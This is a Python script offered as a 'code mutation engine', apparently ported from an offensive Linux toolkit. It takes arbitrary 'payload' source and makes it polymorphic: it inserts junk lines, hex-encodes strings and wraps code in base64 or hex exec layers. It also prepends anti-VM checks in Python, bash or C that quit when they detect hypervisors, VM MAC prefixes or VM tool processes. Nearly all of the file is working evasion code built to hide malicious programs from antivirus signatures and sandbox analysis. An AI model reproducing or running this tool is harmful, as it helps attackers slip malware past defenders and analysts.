#!/usr/bin/env python3
"""
POLYMORPH — Code Mutation Engine
Port of polymorph.ts + specter.ts from RedLinux v4.1
Anti-VM injection, string obfuscation, hex encoding, junk code insertion.

by 🇭🇷PhonkAlphabet
"""

import hashlib
import random
import base64
import re
import os


def mutate_source(source: str, language: str = "python") -> str:
    """Mutate source code with stochastic junk insertion + string obfuscation.
       Port of polymorph.ts mutateSourceCode()."""
    lines = source.split("\n")
    mutated = []
    for line in lines:
        # 30% chance junk line insertion
        if random.randint(1, 100) > 70:
            junk_var = f"_0x{os.urandom(2).hex()}"
            junk_val = random.randint(1, 999)
            if language == "python":
                junk = f"{junk_var} = {junk_val}  # shadow-op"
            elif language == "bash":
                junk = f"# {junk_var}={junk_val}  # decoy"
            else:
                junk = f"int {junk_var} = {junk_val}; /* shadow-op */"
            mutated.append(junk)
            mutated.append(line)
            continue

        # String literal obfuscation
        if '"' in line or "'" in line:
            def _obfuscate_str(m):
                s = m.group(1)
                if language == "python":
                    hex_str = s.encode().hex()
                    return f"bytes.fromhex('{hex_str}').decode()"
                elif language == "bash":
                    escaped = "".join(f"\\x{ord(c):02x}" for c in s)
                    return f"$'{escaped}'"
                else:
                    chars = ", ".join(f"'\\x{ord(c):02x}'" for c in s)
                    return f"(char[]){{{chars}, 0}}"
            line = re.sub(r'"([^"]+)"', _obfuscate_str, line)
        mutated.append(line)

    return "\n".join(mutated)


def _anti_vm_python() -> str:
    return (
        "def _check_vm():\n"
        "    import os, subprocess\n"
        "    try:\n"
        "        r = subprocess.check_output(\"grep -c -E 'hypervisor|vmware|qemu' /proc/cpuinfo\", shell=True, timeout=3).decode().strip()\n"
        "        if int(r) > 0:\n"
        "            return True\n"
        "        for iface in os.listdir('/sys/class/net/'):\n"
        "            try:\n"
        "                with open(f'/sys/class/net/{iface}/address') as f:\n"
        "                    mac = f.read().strip()[:8]\n"
        "                    if mac in ('08:00:27', '00:0c:29', '00:50:56', '00:05:69', '00:1c:14'):\n"
        "                        return True\n"
        "            except:\n"
        "                pass\n"
        "        procs = subprocess.check_output(\"ps aux\", shell=True, timeout=3).decode().lower()\n"
        "        for p in ['vmtoolsd', 'vboxguest', 'xenserver', 'hyper-v']:\n"
        "            if p in procs:\n"
        "                return True\n"
        "    except:\n"
        "        pass\n"
        "    return False\n"
        "if _check_vm():\n"
        "    exit(0)\n"
    )


def _anti_vm_bash() -> str:
    return (
        "# VM detection preamble\n"
        "if grep -q -E 'hypervisor|vmware|qemu' /proc/cpuinfo 2>/dev/null; then exit 0; fi\n"
        "for iface in /sys/class/net/*/address; do\n"
        '    mac=$(cat "$iface" 2>/dev/null | head -c 8)\n'
        '    case "$mac" in\n'
        "        08:00:27|00:0c:29|00:50:56|00:05:69) exit 0 ;;\n"
        "    esac\n"
        "done\n"
    )


def _anti_vm_c() -> str:
    return (
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <string.h>\n"
        "int _check_vm() {\n"
        "    FILE *fp; char buf[1024]; int score = 0;\n"
        '    fp = popen("grep -c -E \'hypervisor|vmware|qemu\' /proc/cpuinfo", "r");\n'
        "    if (fp && fgets(buf, sizeof(buf), fp) != NULL && atoi(buf) > 0) score += 50;\n"
        "    if (fp) pclose(fp);\n"
        '    fp = popen("cat /sys/class/net/*/address 2>/dev/null", "r");\n'
        "    while (fp && fgets(buf, sizeof(buf), fp) != NULL) {\n"
        '        if (strncmp(buf,"08:00:27",8)==0||strncmp(buf,"00:0c:29",8)==0||strncmp(buf,"00:50:56",8)==0) score+=30;\n'
        "    }\n"
        "    if (fp) pclose(fp);\n"
        "    return score >= 50;\n"
        "}\n"
    )


def inject_anti_vm(source: str, language: str = "python") -> str:
    """Prepend anti-VM detection preamble. Port of polymorph.ts injectAntiVM()."""
    if language == "python":
        return _anti_vm_python() + "\n" + source
    elif language == "bash":
        return _anti_vm_bash() + "\n" + source
    else:
        # C — inject check_vm() before main()
        preamble = _anti_vm_c()
        source = re.sub(
            r'(int\s+main\s*\([^)]*\)\s*\{)',
            r'\1\n    if (_check_vm()) exit(0);',
            source
        )
        return preamble + "\n" + source


def hex_layer(source: str) -> str:
    """Wrap source in hex-encoded exec layer (Python)."""
    hex_str = source.encode().hex().upper()
    return f'import base64\nexec(base64.b16decode("{hex_str}").decode())\n'


def base64_layer(source: str) -> str:
    """Wrap source in b64 exec layer (Python)."""
    b64 = base64.b64encode(source.encode()).decode()
    return f'import base64\nexec(base64.b64decode("{b64}").decode())\n'


def polymorph_payload(source: str, language: str = "python",
                      anti_vm: bool = True,
                      use_hex: bool = False,
                      use_b64: bool = False,
                      mutation_passes: int = 1) -> str:
    """Full polymorphic pipeline:
       1. Anti-VM injection
       2. Code mutation (junk + string obfuscation)
       3. Encoding wrapper (optional)
    """
    result = source
    if anti_vm:
        result = inject_anti_vm(result, language)
    for _ in range(mutation_passes):
        result = mutate_source(result, language)
    if use_hex:
        result = hex_layer(result)
    elif use_b64:
        result = base64_layer(result)
    return result


def hash_payload(payload: str) -> str:
    """SHA-256 hash for signature tracking."""
    return hashlib.sha256(payload.encode()).hexdigest()


# ─── CLI ───
if __name__ == "__main__":
    import sys
    action = sys.argv[1] if len(sys.argv) > 1 else "mutate"
    infile = sys.argv[2] if len(sys.argv) > 2 else None
    lang = sys.argv[3] if len(sys.argv) > 3 else "python"

    src = open(infile).read() if infile and infile != "-" else sys.stdin.read()

    if action == "mutate":
        print(mutate_source(src, lang))
    elif action == "anti-vm":
        print(inject_anti_vm(src, lang))
    elif action == "hex":
        print(hex_layer(src))
    elif action == "b64":
        print(base64_layer(src))
    elif action == "full":
        out = polymorph_payload(src, lang, anti_vm=True, mutation_passes=2)
        print(out)
    else:
        print(f"Usage: {sys.argv[0]} [mutate|anti-vm|hex|b64|full] [file|-] [lang]")
